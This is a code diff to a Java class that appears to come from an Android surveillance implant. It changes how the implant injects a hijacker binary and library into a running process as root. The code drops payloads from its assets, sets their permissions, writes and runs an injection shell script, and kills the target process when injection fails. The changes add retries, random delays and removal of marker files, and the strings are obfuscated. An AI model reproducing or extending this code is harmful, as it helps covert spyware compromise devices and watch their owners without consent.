@@ -4,16 +4,12 @@ import com.android.dvci.Beep;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
-import com.android.dvci.conf.Configuration;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.file.AutoFile;
 import com.android.mm.M;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
+import java.util.Date;
 import java.util.concurrent.Semaphore;
 import java.util.concurrent.TimeUnit;
 
@@ -28,7 +24,10 @@ public class Instrument {
 	private Semaphore sync_semaphore =null;
 	private Thread monitor;
 	private int killed = 0;
+	private boolean started = false;
+	private String instrumentationSuccessDir = null;
 	private String lid = M.e(" lid ");
+
 
 	public Instrument(String process, String dump,String _pidFile,Semaphore sem,String library) {
 		final File filesPath = Status.getAppContext().getFilesDir();
@@ -49,6 +48,19 @@ public class Instrument {
 		dexFile = _dexFile;
 		dex_dest = "d"+dexFile.hashCode()+".dex";
 
+
+	}
+
+	public String getInstrumentationSuccessDir() {
+		return instrumentationSuccessDir;
+	}
+
+	public void setInstrumentationSuccessDir(String instrumentationSuccessDir) {
+		this.instrumentationSuccessDir = instrumentationSuccessDir;
+	}
+
+	public boolean isStarted() {
+		return started;
 	}
 
 	private boolean deleteHijacker() {
@@ -76,7 +88,7 @@ public class Instrument {
 			Utils.dumpAsset(M.e("mb.data"), hijacker);
 			if(dexFile!= null){
 				File src = new File(path + "/" + dex_dest);
-				Utils.dumpAsset(dexFile,dex_dest);
+				Utils.dumpAsset(dexFile, dex_dest);
 				Execute.chmod(M.e("750"), path + "/" + dex_dest);
 				Utils.copy(src,new File(dumpPath + "/" + dex_dest));
 				Execute.chmod(M.e("777"), dumpPath + "/" + dex_dest);
@@ -86,7 +98,9 @@ public class Instrument {
 			// Install library
 			Execute.chmod(M.e("666"), path + "/" + lib_dest);
 			Execute.chmod(M.e("750"), path + "/" + hijacker);
-
+			if(getInstrumentationSuccessDir()== null) {
+				setInstrumentationSuccessDir(dumpPath);
+			}
 
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
@@ -98,11 +112,36 @@ public class Instrument {
 
 		return true;
 	}
+	public boolean startInstrumentation() {
+		return startInstrumentation(180);
+	}
+	public boolean startInstrumentation(int timeout)  {
+		if ( timeout<=0 ){
+			timeout = 180;
+		}
+		Date start = new Date();
+		long diff_sec = 0;
+		while(diff_sec<timeout) {
+			if( _startInstrumentation()  ){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(startInstrumentation): Done");
+				}
+				return true;
+			}
+			Utils.sleep(5);
+			diff_sec = (new Date().getTime() - start.getTime()) / 1000;
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "(startInstrumentation): Time out sec="+timeout);
+		}
 
-	public boolean startInstrumentation()  {
+		return isStarted();
+	}
+
+	public boolean _startInstrumentation() {
 		if (!Status.haveRoot()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
+				Check.log(TAG + "(_startInstrumentation): Nope, we are not root");
 			}
 
 			return false;
@@ -112,8 +151,9 @@ public class Instrument {
 			return false;
 		}
 
+
 		try {
-			if(sync_semaphore == null || sync_semaphore.tryAcquire(10, TimeUnit.SECONDS)) {
+			if(sync_semaphore == null || sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS)) {
 				try {
 					int pid = getProcessPid(proc);
 
@@ -121,6 +161,7 @@ public class Instrument {
 						// Run the injector
 						String scriptName = "ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
+						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + "\n";
 						if( StringUtils.isEmpty(dexFile)) {
 							script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib_dest + " -f " + dumpPath + "\n";
 						}else{
@@ -138,20 +179,23 @@ public class Instrument {
 						int newpid = getProcessPid(proc);
 						if (newpid != pid) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) Error: "+proc+" was killed");
+								Check.log(TAG + " (_startInstrumentation) Error: "+proc+" was killed");
 							}
 						}
 
-						File d = new File(dumpPath);
+						File d = new File(getInstrumentationSuccessDir());
 
-						boolean started = false;
+						started = false;
 
 						for (int i = 0; i < 5 && !started; i++) {
 							File[] files = d.listFiles();
+							if ( files == null ){
+								break;
+							}
 							for (File file : files) {
 								if (file.getName().endsWith(M.e(".cnf"))) {
 									if (Cfg.DEBUG) {
-										Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+										Check.log(TAG + " (_startInstrumentation) got file: " + file.getName());
 									}
 									started = true;
 									file.delete();
@@ -164,7 +208,7 @@ public class Instrument {
 							}
 							if (!started) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startInstrumentation) sleep 5 secs "+proc);
+									Check.log(TAG + " (_startInstrumentation) sleep 5 secs "+proc);
 								}
 								Utils.sleep(2000);
 							}
@@ -172,7 +216,7 @@ public class Instrument {
 
 						if (!started && killed < MAX_KILLED) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) Kill "+proc);
+								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
 							}
 							killProc(proc);
 							// Utils.sleep(1000);
@@ -181,7 +225,7 @@ public class Instrument {
 
 							if (started) {
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (startInstrumentation) "+proc+" Hijack installed");
+									Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
 								}
 								EvidenceBuilder.info(proc + M.e(" injected"));
 							}
@@ -191,8 +235,8 @@ public class Instrument {
 
 						if (pidMonitor == null) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + " (startInstrumentation) script: \n" + script);
-								Check.log(TAG + "(startInstrumentation): Starting "+proc+ " Monitor thread");
+								Check.log(TAG + " (_startInstrumentation) script: \n" + script);
+								Check.log(TAG + "(_startInstrumentation): Starting "+proc+ " Monitor thread");
 							}
 
 							pidMonitor = new PidMonitor(newpid);
@@ -203,13 +247,13 @@ public class Instrument {
 						}
 					} else {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "(getProcessPid): unable to get pid for "+ proc);
+							Check.log(TAG + "(_startInstrumentation): unable to get pid for "+ proc);
 						}
 
 					}
 				} catch (Exception e) {
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (startInstrumentation) Error: "+ proc , e);
+						Check.log(TAG + " (_startInstrumentation) Error: "+ proc , e);
 					}
 					return false;
 				} finally {
@@ -219,10 +263,12 @@ public class Instrument {
 						sync_semaphore.release();
 					}
 				}
+			}else{
+				return false;
 			}
 		} catch (InterruptedException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startInstrumentation) Error: "+proc + e);
+				Check.log(TAG + " (_startInstrumentation) Error: "+proc + e);
 			}
 			return false;
 		}
@@ -244,7 +290,7 @@ public class Instrument {
 
 			try {
 				if(sync_semaphore != null){
-					sync_semaphore.tryAcquire(10, TimeUnit.SECONDS);
+					sync_semaphore.tryAcquire(Utils.getRandom(10), TimeUnit.SECONDS);
 				}
 
 				try {
